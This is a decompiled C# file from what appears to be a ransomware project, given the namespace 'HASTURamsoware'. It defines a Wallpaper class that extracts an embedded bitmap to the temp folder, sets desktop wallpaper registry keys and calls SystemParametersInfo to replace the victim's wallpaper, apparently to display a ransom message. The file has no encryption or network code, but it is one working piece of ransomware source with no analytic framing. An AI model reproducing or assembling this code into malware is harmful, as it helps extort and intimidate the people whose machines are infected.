using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace HASTURamsoware;

internal class Wallpaper
{
	public enum Style
	{
		Tiled,
		Centered,
		Stretched
	}

	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDWININICHANGE = 2;

	private Assembly _assembly = Assembly.GetExecutingAssembly();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public void Set(Style style)
	{
		string text = "wallpaper.bmp";
		string text2 = Path.Combine(Path.GetTempPath(), text);
		ExtractToFile(text, text2);
		Assembly.GetExecutingAssembly();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		if (style == Style.Stretched)
		{
			registryKey.SetValue("WallpaperStyle", 2.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
		}
		if (style == Style.Centered)
		{
			registryKey.SetValue("WallpaperStyle", 1.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
		}
		if (style == Style.Tiled)
		{
			registryKey.SetValue("WallpaperStyle", 1.ToString());
			registryKey.SetValue("TileWallpaper", 1.ToString());
		}
		SystemParametersInfo(20, 0, text2, 3);
	}

	private string GetResourceName(string resourceName)
	{
		string result = null;
		string[] manifestResourceNames = _assembly.GetManifestResourceNames();
		foreach (string text in manifestResourceNames)
		{
			if (!text.EndsWith(resourceName))
			{
				Console.WriteLine(text);
				continue;
			}
			result = text;
			break;
		}
		return result;
	}

	public void ExtractToFile(string resourceFileName, string outFilename)
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		string resourceName = GetResourceName(resourceFileName);
		if (resourceName == null)
		{
			throw new Exception(string.Format("No existe en la lista de recursos", resourceFileName));
		}
		try
		{
			Stream manifestResourceStream = _assembly.GetManifestResourceStream(resourceName);
			FileStream fileStream = new FileStream(outFilename, FileMode.Create);
			int count = 1024;
			byte[] buffer = new byte[1024];
			int num;
			do
			{
				num = manifestResourceStream.Read(buffer, 0, count);
				fileStream.Write(buffer, 0, num);
			}
			while (num != 0);
			fileStream.Close();
		}
		catch (Exception)
		{
			MessageBox.Show("error loading wallpaper");
		}
	}
}
